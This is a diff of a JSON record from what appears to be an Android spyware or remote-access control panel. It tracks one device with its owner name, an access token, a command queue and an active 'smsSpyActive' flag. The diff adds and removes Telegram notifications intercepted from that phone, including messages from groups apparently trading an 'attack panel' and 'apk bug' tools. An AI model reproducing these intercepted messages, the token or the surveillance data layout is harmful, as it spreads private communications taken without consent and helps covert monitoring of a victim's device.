@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637113575,
+    "lastSeen": 1775637122498,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:32",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637125015
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:32",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637124952
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:32",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637124943
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: Gok",
+        "content": "Cara pakai attack panel gimana",
+        "time": "08/04 15:32",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637124856
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "14 new messages from 13 chats",
+        "time": "08/04 15:32",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775637124664
+      },
       {
         "appName": "Telegram",
         "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
@@ -4278,46 +4318,6 @@
         "time": "08/04 14:42",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775634128451
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "15 new messages from 12 chats",
-        "time": "08/04 14:42",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634128317
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "JDI? BELIK YANG MN?",
-        "time": "08/04 14:42",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634128261
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
-        "content": "Voice message",
-        "time": "08/04 14:42",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634128226
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: Alifzx rezz",
-        "content": "Sini belik apk bug gue",
-        "time": "08/04 14:42",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634128180
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "14 new messages from 12 chats",
-        "time": "08/04 14:42",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775634127832
       }
     ],
     "galleryPhotos": [],
